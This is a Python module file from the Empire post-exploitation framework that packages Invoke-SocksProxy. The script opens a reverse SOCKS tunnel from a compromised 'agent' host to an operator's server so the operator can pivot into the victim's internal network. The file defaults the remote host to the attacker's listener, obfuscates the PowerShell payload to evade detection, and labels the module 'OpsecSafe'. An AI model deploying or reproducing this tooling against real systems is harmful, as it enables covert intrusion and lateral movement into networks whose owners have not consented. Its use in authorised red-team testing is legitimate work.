from __future__ import print_function

from builtins import str
from builtins import object
from lib.common import helpers


class Module(object):

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-SocksProxy',

            'Author': ['@p3nt4'],

            'Description': ("The reverse proxy creates a TCP tunnel by initiating outbound SSL connections that "
                            "can go through the system's proxy. The tunnel can then be used as a socks proxy on "
                            "the remote host to pivot into the local host's network."),

            'Software': '',

            'Techniques': ['T1090'],

            'Background': True,

            'OutputExtension': None,

            'NeedsAdmin': False,

            'OpsecSafe': True,

            'Language': 'powershell',

            'MinLanguageVersion': '2',

            'Comments': [
                'This is only a subset of the Socks 4 and 5 protocols: It does not support authentication',
                'It does not support UDP or bind requests',
                'https://github.com/BC-SECURITY/Invoke-SocksProxy'
            ]
        }

        self.options = {
            'Agent': {
                'Description': 'Agent to run module on.',
                'Required': True,
                'Value': ''
            },
            'remoteHost': {
                'Description': 'IP Address of the SocksProxy server.',
                'Required': True,
                'Value': '%s' % (helpers.lhost())
            },
            'remotePort': {
                'Description': 'Remote Port for the SocksProxy server.',
                'Required': True,
                'Value': '443'
            },
            'useSystemProxy': {
                'Description': 'Go through the system proxy',
                'Required': False,
                'Value': ''
            },
            'certFingerprint': {
                'Description': 'Validate certificate',
                'Required': False,
                'Value': ''
            },
            'maxRetries': {
                'Description': 'Maximum number of retries for a handler.',
                'Required': False,
                'Value': ''
            }
        }

        self.mainMenu = mainMenu

        if params:
            for param in params:
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self, obfuscate=False, obfuscationCommand=""):

        module_source = self.mainMenu.installPath + "/data/module_source/management/Invoke-SocksProxy.psm1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=module_source, obfuscationCommand=obfuscationCommand)
            module_source = module_source.replace("module_source", "obfuscated_module_source")
        try:
            f = open(module_source, 'r')
        except:
            print(helpers.color("[!] Could not read module source path at: " + str(module_source)))
            return ""

        module_code = f.read()
        f.close()

        script = module_code
        script_end = "\nInvoke-ReverseSocksProxy"

        # Add any arguments to the end execution of the script
        for option, values in self.options.items():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # if we're just adding a switch
                        script_end += " -" + str(option)
                    else:
                        script_end += " -" + str(option) + " " + str(values['Value'])
        if obfuscate:
            script_end = helpers.obfuscate(psScript=script_end, installPath=self.mainMenu.installPath,
                                           obfuscationCommand=obfuscationCommand)
        script += script_end
        script = helpers.keyword_obfuscation(script)

        print(helpers.color("[*] Start your Invoke-SocksProxy server before continuing"))
        print(helpers.color("[*] Follow directions at git clone https://github.com/BC-SECURITY/Invoke-SocksProxy.git"))

        while True:
            a = input(helpers.color("[>] Are you sure you want to continue [n/Y]: "))
            if a.lower() == 'y':
                break
            else:
                continue

        return script
